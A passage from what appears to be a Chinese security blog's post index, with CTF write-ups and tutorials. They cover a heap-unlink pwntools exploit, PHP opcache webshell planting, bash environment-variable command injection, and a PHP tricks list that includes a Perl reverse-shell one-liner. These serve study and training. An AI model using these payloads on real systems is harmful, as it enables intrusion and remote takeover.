0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]\n\nimport pyzbar.pyzbar as pyzbar\nfrom itertools import permutations\nfrom PIL import Image, ImageDraw as draw\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nshuffle_1 = [9, 11, 13, 15, 17, 19]\nshuffle_2 = [10, 12, 14, 16, 18]\nhead = data[0:9]\ntail = data[20:]\n\ndef body(body_1, body_2):\n    body = []\n    for i in range(5):\n        body.append(body_1[i])\n        body.append(body_2[i])\n    body.append(body_1[5])\n    return [data[i] for i in body]\n\ndef draw_img(data):\n    assert len(data) == 29 and len(data[0]) == 29\n    img = Image.new('RGB', (31, 31), (255,255,255))\n    for i, row in enumerate(data):\n        for j, pixel in enumerate(row):\n            img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))\n    return img\n\nwith tqdm(total=720 * 120) as pbar:\n    for body_1 in permutations(shuffle_1):\n        for body_2 in permutations(shuffle_2):\n            im = draw_img(head + body(body_1, body_2) + tail)\n            barcodes = pyzbar.decode(im)\n            pbar.update(1)\n            if(len(barcodes) == 0):\n                continue\n            for barcode in barcodes:\n                barcodeData = barcode.data.decode(\"utf-8\")\n                print(barcodeData)\n                plt.imshow(im)\n                plt.show()\n```\n\n\n\n### misc3 ###\nbinwalk分理出一个压缩包\n\n![](/img/wp/2022/2022qwbqsn-4.png)\n\n\n还是lsb解密，密码在图片结尾，`7his_1s_p4s5w0rd`\n\n![](/img/wp/2022/2022qwbqsn-5.png)\n\n![](/img/wp/2022/2022qwbqsn-6.png)\n\n\n## reverse ##\n\n### re2 ###\n\n通过gdb动态调试获取地图的全貌\n\n0层\n 0  1  1  1 1  1  1  1\n 0  0  0  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n\n1层\n 1  1  1  1 1  1  1  1\n 1  1  0  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n\n2层\n 1  1  1  1 1  1  1  1\n 1  1  0  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  1  1  1\n\n3层\n 1  1  1  1 1  1  1  1\n 1  1  0  0 1  1  1  1\n 1  1  1  0 1  1  1  1\n 1  1  1  0 1  1  1  1\n 1  1  1  0 1  0  1  1\n 1  1  1  0 1  1  1  1\n 1  1  1  0 0  0  1  1\n 1  1  1  1 1  1  1  1\n\n4层\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n\n5层\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n\n6层\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  0  0\n 1  1  1  1 1  1  1  0\n\n7层\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  1  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  0  1  1\n 1  1  1  1 1  1  1  0\n\n`511=64*7+63`所以程序要求从第0层的开头走到第7层的结尾\n\n分别通过`a-下，b-上，l-左，r-右，u-下一层，d-上一层`进行移动\n\n![](/img/wp/2022/2022qwbqsn-7.png)\n\n\ninput: `arruuuraaaaarrdbbuuuuuaadrrau`\n\nflag：`flag{6c2a5b75-232d-26ea-c3cc-8f7a924d7357}`\n\n\n## pwn ##\n\n### pwn2 ###\n\n利用创建`chunk`时的`off by null`漏洞，通过`chunk3`设置`chunk4`的`inuse`位为`0`，这样在释放`chunk4`时就会触发`unlink`\n\n利用`unlink`，在`chunk_list`中写入`chunk_list`的地址，这样可以达到任意地址读写,需要在合并之前将`chunk3`的`fd->bk`与`bk->fd`指向`chunk3`,`chunk3->fd`与`chunk3->bk`，就为`chunk_list`上的地址\n\n然后因为程序中`strlen`和`free`都是以`chunk`为第一个参数，所以可以通过修改`got表`内`free`的内容为`plt表`中的`puts`，来获取`chunk3`的`fd`字段，计算得到`libc`地址，通过修改`got表`中的`strlen内容`为`system`地址 执行`system(\"/bin/sh\")`\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level='debug'\ndef add(ind,size,data):\n    p.sendlineafter('>','1')\n    p.sendlineafter('(0~9):',str(ind))\n    p.sendlineafter('(1 ~ 1024):',str(size))\n    p.sendafter('Content:',data)\n\ndef show(ind):\n    p.sendlineafter('>','2')\n    p.sendlineafter('(0~9):',str(ind))\n\ndef free(ind):\n    p.sendlineafter('>','3')\n    p.sendlineafter('(0~9):',str(ind))\n\ndef edit(ind,data):\n    p.sendlineafter('>','4')\n    p.sendlineafter('(0~9):',str(ind))\n    p.sendafter('Content:',data)\n\np=remote('101.200.76.17','24195')\n#p=process('./b64heap')\n#gdb.attach(p)\ne=ELF('./b64heap',checksec=0)\nlibc=ELF('./libc-2.23.so',checksec=0)\nfree_got=e.got['free']\nstrlen_got=e.got['strlen']\nputs_plt=e.plt['puts']\nchunk_list=0x6020c0\nheap_list=chunk_list\n\nadd(0,0x10,\"/bin/sh\\x00\")\nadd(1,0x10,\" \")\nadd(2,0x10,\" \")\nadd(3,0x90,\" \")\nadd(4,0xf0,\" \")\nadd(5,0x30,\" \")\nadd(6,0x30,'/bin/sh\\x00')\nfree(3)\nfd=heap_list+0x8*3-0x18\nbk=heap_list+0x8*3-0x10\nadd(3,0x98,p64(0)+p64(0x91)+p64(fd)+p64(bk)+b'a'*0x70+p64(0x90))\nfree(4)\n#free(3)\nedit(3,b'a'*8)\nshow(3)\nedit(3,p64(heap_list+0x8*5))\nedit(0,p64(heap_list+0x8))\nedit(3,p64(free_got))\nedit(5,p8(0x80))\nedit(0,p64(puts_plt))\nfree(1)\nd=u64(p.read(6).ljust(8,b'\\x00'))\nprint(hex(d))\nmalloc_hook=d-0x58-0x10\n\nsystem=malloc_hook-libc.sym['__malloc_hook']+libc.sym['system']\nprint(hex(strlen_got))\nprint(hex(system))\nedit(3,p64(strlen_got))\nedit(0,p64(system))\n\nedit(6,'cat flag\\n')\n\np.interactive()\n```\n\n![](/img/wp/2022/2022qwbqsn-8.png)\n\n\n## crypto ##\n\n### crypto1 ###\n\n只有A，B和空格，明显是摩斯\n将`A`替换成`-`，`B`替换成`.`，`空格`替换`/`\n\n\n解密脚本\n```python\nclass morse:\n    def __init__(self):\n        self.codedict={'.-':\"a\",\n                    '-...':\"b\",\n                    '-.-.':\"c\",\n                    '-..':\"d\",\n                    '.':\"e\",\n                    '..-.':\"f\",\n                    '--.':\"g\",\n                    '....':\"h\",\n                    '..':\"i\",\n                    '.---':\"j\",\n                    '-.-':\"k\",\n                    '.-..':\"l\",\n                    '--':\"m\",\n                    '-.':\"n\",\n                    '---':\"o\",\n                    '.--.':\"p\",\n                    '--.-':\"q\",\n                    '.-.':\"r\",\n                    '...':\"s\",\n                    '-':\"t\",\n                    '..-':\"u\",\n                    '...-':\"v\",\n                    '.--':\"w\",\n                    '-..-':\"x\",\n                    '-.--':\"y\",\n                    '--..':\"z\",\n                    '.----':\"1\",\n                    '..---':\"2\",\n                    '...--':\"3\",\n                    '....-':\"4\",\n                    '.....':\"5\",\n                    '-....':\"6\",\n                    '--...':\"7\",\n                    '---..':\"8\",\n                    '----.':\"9\",\n                    '-----':\"0\",\n                    '..--..':\"?\",\n                    '-..-.':\"/\",\n                    '-.--.':\"(\",\n                    '-.--.-':\")\",\n                    '-....-':\"-\",\n                    '.-.-.-':\".\",\n                    '--..--':',',\n                    '-.-.-.':';',\n                    '.----.':'\\''}\n\n    def GetPlain(self,text):\n        textlist=text.split('/')\n        detext=''\n        for i in textlist:\n            detext+=self.codedict[i]\n        return detext;\n\n    def DeBlast(self,text,detext):\n        for i in self.codedict.keys():\n            if text.find(i)==0:\n                if (len(text)-len(i))==0:\n                    self.delist.append(detext+self.codedict[i])\n                    continue\n                self.DeBlast(text[len(i):],detext+self.codedict[i])\n\n    def decode(self,text,seg='/',point='.',hor='-',blast=0,out=1):\n        \"\"\"\n            key[0]=='.'\n            key[1]=='-'\n            key[2]=='/'\n        \"\"\"\n        key=[point,hor,seg]\n        div=['.','-','/']\n        if blast==0:\n            self.detext=self.GetPlain(text)\n            if out:\n                print(self.detext)\n            return self.detext\n        else:\n            for i in range(2):\n                text=text.replace(key[i],div[i])\n            self.delist=[]\n            self.DeBlast(text,'')\n            if out:\n                for i in self.delist:\n                        print(i)\n            return self.delist\nm=morse()\nf=open('classicCrypto.txt')\nd=f.read().splitlines()\ne=''\nfor i in d:\n    e=e+m.decode(i)+' '\nprint(e)\n```\n\n![](/img/wp/2022/2022qwbqsn-9.png)\n\n在https://quipqiup.com/爆破\n\n`cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography's potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.`\n\n得到flag：`1d817f23-4e20-9405-bf6d-e83d055316d6`\n\n\n\n### crypto2 ###\n将题目给出的字符串进行栅栏后发现与flag形式接近\n\n![](/img/wp/2022/2022qwbqsn-10.png)\n\n\n根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的`l`为`-`，所以原先小写的字符在异或32的基础上还要减去31\n\n解题脚本\n```python\na=\"FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv\"\nb=\"FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]\"\ne=''\nfor i in b:\n    if i.islower():\n        e=e+chr((ord(i)^32)-31)\n    else:\n        e=e+chr(ord(i)^32)\nprint(e)\n```\n\n![](/img/wp/2022/2022qwbqsn-11.png)\n\n","tags":["wp","2022竞赛","强网杯"],"categories":["wp"]},{"title":"opcache缓存利用","url":"/posts/3b0128e6/","content":"\n# 什么是opcache #\n\nopencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）\n\n项目github[地址](https://github.com/GoSecure/php7-opcache-override)\n\n\n# 一：opcache缓存+文件包含 #\n\n靶机：`lewiserii/php7-opcache-include`\n\n例题：\n```php\n<?php\nerror_reporting(0);\n\n//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.\nif ( isset($_GET['file']) ) {\n    $file = $_GET['file'];\n\n    if ( $file === \"phpinfo\" ) {\n\n        phpinfo();\n        exit;\n    }\n\n    if ( preg_match('/proc/i' , $file) ) {\n        die(\"private\");\n    }\n\n    $file = \"/var/www/html/\" . $file;\n    $content = file_get_contents($file);\n\n    if ( !$content ) {\n        die(\"nothing\");\n    }\n\n    if ( preg_match(\"/script|<\\?/i\", $content) ) {\n        die(\"bypass me\");\n    }\n\n    include_once $file;\n\n} else {\n    highlight_file(__FILE__);\n}\n```\n\n看下opcache的状态是开启还是关闭的\n\n![](/img/php/php-opcache-1.png)\n\n\n从上图可以得出结论，在`/var/www/cache/`下存在着PHP的缓存文件，其完整的绝对路径是`/var/www/cache/[一个 md5]/var/www/html/flag.php.bin`\n\n如果要包含文件的话就要知道路径中的md5值，查阅资料可知，这个md5被称为 `system id`,它的计算算法是固定的，由php版本号、zend extension id、Zend Bin ID，这三样拼接起来md5即可，而这3种东西正好全都在phpinfo里可以拿到，可以使用该脚本一键计算：\n\n```php\n#!/usr/bin/env python2\n\n# Copyright (c) 2016, 2019 GoSecure Inc.\n\nimport sys\nfrom packaging import version\nimport re\nimport requests\n\ndef md5(data):\n    if type(data) is str:\n        data = bytes(data, encoding='utf-8')\n    return __import__('hashlib').md5(data).hexdigest()\n\nif len(sys.argv) != 2:\n    print(sys.argv[0] + \" [file|URL]\")\n    exit(0)\n\nif (sys.argv[1].startswith(\"http\")):\n    text = requests.get(sys.argv[1]).text\nelse:\n    with open(sys.argv[1]) as file:\n        text = file.read()\n        file.close()\n\n# PHP Version\nphp_version = re.search('<tr><td class=\"e\">PHP Version </td><td class=\"v\">(.*) </td></tr>', text)\n\nif php_version == None:\n    php_version = re.search('<h1 class=\"p\">PHP Version (.*)', text)\n\nif php_version == None:\n    print(\"No PHP version found, is this a phpinfo file?\")\n    exit(0)\n\nphp_version = php_version.group(1)\nphp_greater_74 = (version.parse(\"7.4.0\") < version.parse(php_version.split(\"-\")[0]))\n# Zend Extension Build ID\nzend_extension_id = re.search('<tr><td class=\"e\">Zend Extension Build </td><td class=\"v\">(.*) </td></tr>', text)\nif zend_extension_id == None:\n    print(\"No Zend Extension Build found.\")\n    exit(0)\nzend_extension_id = zend_extension_id.group(1)\n\n# Architecture\narchitecture = re.search('<tr><td class=\"e\">System </td><td class=\"v\">(.*) </td></tr>', text)\nif architecture == None:\n    print(\"No System info found.\")\n    exit(0)\narchitecture = architecture.group(1).split()[-1]\n\n# Zend Bin ID suffix\nif architecture == \"x86_64\":\n    bin_id_suffix = \"48888\"\nelse:\n    bin_id_suffix = \"44444\"\n\n# With PHP 7.4 they fixed the undefined macro that did the weird bin ID\nif php_greater_74:\n    zend_bin_id = \"BIN_\" + bin_id_suffix\nelse:\n    zend_bin_id = \"BIN_SIZEOF_CHAR\" + bin_id_suffix\n\n# Alternate Bin ID, see #5\nif not php_greater_74:\n    if architecture == \"x86_64\":\n        alt_bin_id_suffix = \"148888\"\n    else:\n        alt_bin_id_suffix = \"144444\"\n\n    alt_zend_bin_id = \"BIN_\" + alt_bin_id_suffix\n\n\n# Logging\nprint(\"PHP version : \" + php_version)\nprint(\"Zend Extension ID : \" + zend_extension_id)\nprint(\"Zend Bin ID : \" + zend_bin_id)\nprint(\"Assuming \" + architecture + \" architecture\")\n\ndigest = md5(php_version + zend_extension_id + zend_bin_id)\nprint(\"------------\")\nprint(\"System ID : \" + digest)\n\nif not php_greater_74:\n    alt_digest = md5(php_version + zend_extension_id + alt_zend_bin_id)\n    print(\"PHP lower than 7.4 detected, an alternate Bin ID is possible:\")\n    print(\"Alternate Zend Bin ID : \" + alt_zend_bin_id)\n    print(\"Alternate System ID : \" + alt_digest)\n```\n\n得到`System ID : 0b8bd94e9858e5d32d058dc0acf75014`\n\n![](/img/php/php-opcache-2.png)\n\n\n包含`flag.php.bin`即可\n\n![](/img/php/php-opcache-3.png)\n\n\n# 二：opcache缓存+文件上传 #\n\n\n靶机：`lewiserii/php7-opcache-upload`    //关闭时间戳验证\n\n首页是个文件上传点，可以自定义上传目录，简单测试后发现`/var/www/html`目录没有权限\n\n同时给了个`phpinfo.php`，查看opcache状态，发现是启用状态，直接跑脚本算`system id`\n\n满足这几个条件就可以上传木马bin文件到缓存目录，覆盖后达到getshell的目的\n\n![](/img/php/php-opcache-4.png)\n\n\n得到缓存目录为`/tmp/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html`\n\n\n本地搭建一个opcache环境，写上一句话木马，把生成的`index.php.bin`拿下来\n\n![](/img/php/php-opcache-5.png)\n\n将图中红框部分的本地`system id`替换成靶机算出来的`system id`\n\n![](/img/php/php-opcache-6.png)\n\n上传\n\n![](/img/php/php-opcache-7.png)\n\n再次访问`index.php`，发现内容已被覆盖\n\n![](/img/php/php-opcache-8.png)\n\n\n# 三：修复方式 #\n\n## file_cache_only ##\n\n如果内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件（webshell）是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，当服务器重启之后，内存中的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以被执行了。\n\n\n\n## validate_timestamp ##\n\n当`opcache.validate_timestamps=1`时，bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。\n\n![](/img/php/php-opcache-9.png)","tags":["php"],"categories":["php"]},{"title":"环境变量注入","url":"/posts/7b50f6ef/","content":"\n这篇文章只是对p牛的 [我是如何利用环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html) 这篇文章进行总结\n\n环境变量注入条件：用户可以控制环境变量，有执行命令的点但命令不可控\n\n\n例子：\n\n```php\n<?php\nforeach($_REQUEST['envs'] as $key => $val) {\n    putenv(\"{$key}={$val}\");\n}\n//... 一些其他代码\nsystem('echo hello');\n?>\n```\n\n>其中PHP的system调用的是系统的popen()，而popen()最终执行的是`sh -c \"echo hello\"`\n\n>sh通常只是一个软连接。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash。\n\n\n\n# dash\n\n[dash源码](http://archive.ubuntu.com/ubuntu/pool/main/d/dash/dash_0.5.10.2.orig.tar.gz)\n\n## ENV\n\nmain函数有关环境变量的代码：\n\n```c\nif (\n#ifndef linux\n\t\tgetuid() == geteuid() && getgid() == getegid() &&\n#endif\n\t\tiflag\n\t) {\n\t\tif ((shinit = lookupvar(\"ENV\")) != NULL && *shinit != '\\0') {\n\t\t\tread_profile(shinit);\n\t\t}\n\t}\n```\n\n可以看到代码会先判断`iflag`的值\n\n```c\n#define iflag optlist[3]\n\nconst char optletters[NOPTS] = {\n\t'e',\n\t'f',\n\t'I',\n\t'i',\n\t'm',\n\t'n',\n\t's',\n\t'x',\n\t'v',\n\t'V',\n\t'E',\n\t'C',\n\t'a',\n\t'b',\n\t'u',\n\t0,\n\t0,\n};\n\noptions(int cmdline)\n{\n\tchar *p;\n\tint val;\n\tint c;\n\tint login = 0;\n\n\tif (cmdline)\n\t\tminusc = NULL;\n\twhile ((p = *argptr) != NULL) {\n\t\targptr++;\n\t\tif ((c = *p++) == '-') {\n\t\t\tval = 1;\n      /* ....  */\n      } else if (c == '+') {\n\t\t\tval = 0;\n\t\t} else {\n\t\t\targptr--;\n\t\t\tbreak;\n\t\t}\n\t\twhile ((c = *p++) != '\\0') {\n\t\t\tif (c == 'c' && cmdline) {\n\t\t\t\tminusc = p;\t/* command is after shell args*/\n\t\t\t} else if (c == 'l' && cmdline) {\n\t\t\t\tlogin = 1;\n\t\t\t} else if (c == 'o') {\n\t\t\t\tminus_o(*argptr, val);\n\t\t\t\tif (*argptr)\n\t\t\t\t\targptr++;\n\t\t\t} else {\n\t\t\t\tsetoption(c, val);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn login;\n}\n\n\nsetoption(int flag, int val)\n{\n\tint i;\n\n\tfor (i = 0; i < NOPTS; i++)\n\t\tif (optletters[i] == flag) {\n\t\t\toptlist[i] = val;\n\t\t\tif (val) {\n\t\t\t\t/* #%$ hack for ksh semantics */\n\t\t\t\tif (flag == 'V')\n\t\t\t\t\tEflag = 0;\n\t\t\t\telse if (flag == 'E')\n\t\t\t\t\tVflag = 0;\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\tsh_error(\"Illegal option -%c\", flag);\n\t/* NOTREACHED */\n}\n```\n\n通过以上代码可以知道`setoption`函数会解析传入的参数，当传入了`-i`时，`iflag`就为`1`了\n\n\n结论：所以在dash中需要传入`-i`参数才能执行`read_profile(shinit)`，解析`ENV`变量。但在php的`system`函数中不能使用\n\n```sh\nENV='$(id 1>&2)' dash -i -c 'echo hello'\n```\n\n![](/img/linux/linux-sh-1.png)\n\n\n## PS1、PS4\n\nPS1、PS2、PS4这三个环境变量也会被expandstr函数解析\n\n但是PS1有限制，需要进入交互式shell中才能执行\n\n![](/img/linux/linux-sh-2.png)\n\n\nPS4则只能解析变量，无法执行命令\n\n![](/img/linux/linux-sh-3.png)\n\n\n# bash\n\n[bash源码](https://git.savannah.gnu.org/cgit/bash.git/)\n\n## BASH_ENV\n\n在bash中有个和ENV类似的变量：BASH_ENV\n\n直接那上面的payload改：`BASH_ENV='$(id 1>&2)' bash -c 'echo hello'`\n\n可以发现不需要-i也能执行了\n\n![](/img/linux/linux-sh-4.png)\n\n\n分析这段代码\n\n```c\n  /* A non-interactive shell not named `sh' and not in posix mode reads and\n     executes commands from $BASH_ENV.  If `su' starts a shell with `-c cmd'\n     and `-su' as the name of the shell, we want to read the startup files.\n     No other non-interactive shells read any startup files. */\n  if (interactive_shell == 0 && !(su_shell && login_shell))\n    {\n      if (posixly_correct == 0 && act_like_sh == 0 && privileged_mode == 0 &&\n\t    sourced_env++ == 0)\n\texecute_env_file (get_string_value (\"BASH_ENV\"));\n      return;\n    }\n```\n\n\n从注释中可以看到，当使用sh时，`act_like_sh`的值会为1，就不会解析BASH_ENV了\n\n```c\n  if (shell_name[0] == 's' && shell_name[1] == 'h' && shell_name[2] == '\\0')\n    act_like_sh++;\n  if (shell_name[0] == 's' && shell_name[1] == 'u' && shell_name[2] == '\\0')\n    su_shell++;\n```\n\n所以只能在bash -c的情况下使用\n\n\n## ENV PS1 PROMPT_COMMAND\n\n与dash同样，ENV PS1也能使用\n\n```c\n\n      /* bash */\n      if (act_like_sh == 0 && no_rc == 0)\n\t{\n#ifdef SYS_BASHRC\n#  if defined (__OPENNT)\n\t  maybe_execute_file (_prefixInstallPath(SYS_BASHRC, NULL, 0), 1);\n#  else\n\t  maybe_execute_file (SYS_BASHRC, 1);\n#  endif\n#endif\n\t  maybe_execute_file (bashrc_file, 1);\n\t}\n      /* sh */\n      else if (act_like_sh && privileged_mode == 0 && sourced_env++ == 0)\n\texecute_env_file (get_string_value (\"ENV\"));\n    }\n  else\t\t/* bash --posix, sh --posix */\n    {\n      /* bash and sh */\n      if (interactive_shell && privileged_mode == 0 && sourced_env++ == 0)\n\texecute_env_file (get_string_value (\"ENV\"));\n    }\n```\n\n不过必须是通过sh调用，而不是直接使用bash\n\n`ENV='$(id 1>&2)' sh -i -c \"echo hello\"`\n\nPS1用法一样。在bash中还有一个变量`PROMPT_COMMAND`，设置了这个环境变量后，进入交互式模式前，会执行这个变量里包含的命令\n\n\n`PROMPT_COMMAND='id' bash`\n\n\n## BASH_FUNC_xxx%%\n\nvariables.c的initialize_shell_variables函数用于将环境变量注册成SHELL的变量\n\n![](/img/linux/linux-sh-5.jpg)\n\n```c\n#define BASHFUNC_PREFIX\t\t\"BASH_FUNC_\"\n#define BASHFUNC_PREFLEN\t10\t/* == strlen(BASHFUNC_PREFIX */\n#define BASHFUNC_SUFFIX\t\t\"%%\"\n#define BASHFUNC_SUFFLEN\t2\t/* == strlen(BASHFUNC_SUFFIX) */\n```\n\n```c\nprivmode == 0，即不能传入-p参数\nread_but_dont_execute == 0，即不能传入-n参数\nSTREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)，环境变量名前10个字符等于BASH_FUNC_\nSTREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)，环境变量名后两个字符等于%%\nSTREQN (\"() {\", string, 4)，环境变量的值前4个字符等于() {\n```\n\n其实就是根据环境变量的值初始化一个匿名函数，并赋予其名字\n\n例如`env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'`\n\n再将变量名改成system中执行的函数名，就能实现覆盖\n\n`env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'`\n\n![](/img/linux/linux-sh-6.png)\n\n\n---------------------------------------------\n\n但是设置`BASH_FUNC_myfunc%%`的方法并不完美，因为`BASH_FUNC_`是在Bash 4.4下引入的，centos 7的bash版本默认为Bash 4.2\n\n\n\n[Bash 4.2的补丁](https://bugzilla-attachments.redhat.com/attachment.cgi?id=941826)\n\n可以看到在4.2下的BASHFUNC_SUFFIX是`()`，而不是`%%`\n\n\n![](/img/linux/linux-sh-7.png)\n\n\n更改payload：`env $'BASH_FUNC_echo()=() { id; }' bash -c \"echo hello\"`\n\n解决了文章开头提出的问题\n\n![](/img/linux/linux-sh-8.png)\n\n\n\n\n# 总结\n\n\n|  | dash | bash | 条件 |\n| ---- | ---- | ---- | ---- |\n| ENV | √ | √ | sh或者dash下额外的 -i -c 参数 |\n| PS1 | √ | √ | 交互环境下 |\n| BASH_ENV | × | √ | 可以在 bash -c 时注入任意命令 sh -c 下无效 |\n| PROMPT_COMMAND | × | √ | 交互环境下 |\n| BASH_FUNC_xxx%% | √ | 4.4及以上 √ | 无 |\n| BASH_FUNC_xxx() | √ | 4.4以前 √ | 无 |\n| shellshock | √ | √ | 存在shellshock漏洞 |\n\n","tags":["php","bash"],"categories":["linux"]},{"title":"php_trick","url":"/posts/1ac6587f/","content":"\n\n记录php下的小技巧和特性\n\n\n# 命令执行中断报错\n\n```php\neval($cmd.'aaa');\n```\n\n可以利用`__halt_compiler();`中断编译器的执行，不让eval报错\n\n`$cmd='system(\"whoami\");__halt_compiler();';`\n\n\n# preg_replace /e 模式\n\n\n一部分修正符的含义\n\n```text\n1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个\n2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同\n3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号\n4、/s 与/m相对，单行模式匹配。\n5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。\n6、/x 忽略空白模式。\n```\n\n\npreg_replace 使用了 /e 模式，导致了代码可以被执行\n\n```php\n<?php\necho preg_replace(\"/aa/e\",\"system('whoami');\",\"aa\");\n```\n\n注意：php5.5以上版本/e被弃用\n\n\n\n# Error::getMessage\n\nPHP的内置类 Error::getMessage方法可以返回Error类实例化时接受的字符串\n\n\n`new Error(\"system\")->getMessage`就会返回`system`\n\n例如\n\n```php\n((new $a($aa))->$c())((new $b($bb))->$c());\n((new Error('system'))->getMessage())((new $Error('ls'))->getMessage());\n```\n\n\n# pcntl_exec反弹shell\n\n```php\npcntl_exec('/usr/bin/perl',['-e','use Socket;$i=\"ip\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};']);\n```\n\n# php匿名类\n\n`class@anonymous`+`chr(0)`+`php文件路径`+`:`+`行数$列数`\n\n例子\n\n```php\n<?php\nif (isset($_GET['ezphpPhp8'])) {\n    highlight_file(__FILE__);\n} else {\n    die(\"No\");\n}\n$a = new class {\n    function __construct()\n    {\n    }\n\n    function getflag()\n    {\n        system('cat /flag');\n    }\n};\nunset($a);\n$a = $_GET['ezphpPhp8'];\n$f = new $a();\n$f->getflag();\n?>\n\n//2024红明谷\n```\n\n\n直接构造`class@anonymous%00/var/www/html/flag.php:7$0`即可\n\n或者直接`echo urlencode(get_class($a));`输出\n\n\n# REQUEST的优先级\n\n\n```php\n<?php\nfunction waf($str){\n    foreach ($str as $name => $value) {\n        if(preg_match('/[a-z]/i', $value)){\n            exit(\"waf\");\n        }\n    }\n}\n\nwaf($_REQUEST);\n```\n\n会同时接收post和get，但优先接收post的参数\n\n所以post发送同名参数后get可以绕过\n\n\n\n# 一些替换\n\nlocalhost可以代替/进行绕过\n\n\n\n# php函数小记\n\n```php\nimplode() — 把数组元素组合为一个字符串\n```","tags":["总结","php","trick"],"categories":["php"]},{"title":"奇安信CTF基础培训题目wp","url":"/posts/3ba7d05a/","content":"\n第一次当ctf讲师\\^_\\^\n\n7.12-7.19 week1\n7.19-7.26 week2\n7.26-8.02 week3\n\n\n# web #\n\n## Web-2-hack  ##\n\n使用`dirsearch`扫描后台，发现存在`shell.php`\n\n![](/img/wp/2022/2022qianxin-1.png)\n\n使用burp等工具抓包爆破密码，得到密码`hack`\n\n![](/img/wp/2022/2022qianxin-2.png)\n\n\n## 